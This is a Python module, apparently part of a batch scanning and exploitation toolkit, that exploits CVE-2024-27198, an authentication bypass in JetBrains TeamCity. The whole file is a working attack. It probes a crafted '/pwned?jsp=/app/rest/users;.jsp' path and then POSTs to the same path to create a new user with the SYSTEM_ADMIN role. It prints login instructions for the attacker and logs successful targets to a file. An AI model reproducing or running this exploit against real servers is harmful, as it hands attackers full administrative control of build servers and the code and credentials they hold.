#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3,re
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_27198:
    def exploit(self,url):
        vulnerable_endpoint = "/pwned?jsp=/app/rest/users;.jsp"
        try:
            response = requests.get(url + vulnerable_endpoint, verify=self.ssl,proxies=self.proxy,headers=self.headers, timeout=10)
            http_code = response.status_code
            if http_code == 200:
                if not self.batch:
                    OutPrintInfo("JetBrains", f'Server vulnerable, returning HTTP {http_code}')

                create_user = {
                    "username": self.username,
                    "password": self.password,
                    "email": f"{self.username}@mydomain.com",
                    "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]},
                    # Given admin permissions to your new user, basically you can have complete control of this TeamCity Server
                }
                headers = {"User-Agent":self.headers['User-Agent'],"Content-Type": "application/json"}
                create_user = requests.post(url + vulnerable_endpoint, json=create_user, headers=headers,
                                            verify=self.ssl,proxies=self.proxy)  # POST request to create the new user with admin privileges
                if create_user.status_code == 200:
                    OutPrintInfoSuc("JetBrains", f'New user {self.username} created succesfully! Go to {url} /login.html to login with your new credentials :)')
                    if self.batch:
                        OutPutFile("jetbrains_2024_27198.txt", f'New user {self.username} created succesfully! Go to {url} /login.html to login with your new credentials :)')
                else:
                    if not self.batch:
                        OutPrintInfo("JetBrains", f'Error while creating new user')

            else:
                if not self.batch:
                    OutPrintInfo("JetBrains", f'Probable not vulnerable, returning HTTP {http_code}')
        except Exception as e:
            if not self.batch:
                OutPrintInfo("JetBrains", e)




    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.username = target["username"]
        self.password = target["password"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("JetBrains", '开始检测CVE-2024-27198身份验证绕过漏洞...')
        self.exploit(url)
        if not self.batch:
            OutPrintInfo("JetBrains", 'CVE-2024-27198身份验证绕过漏洞检测结束')



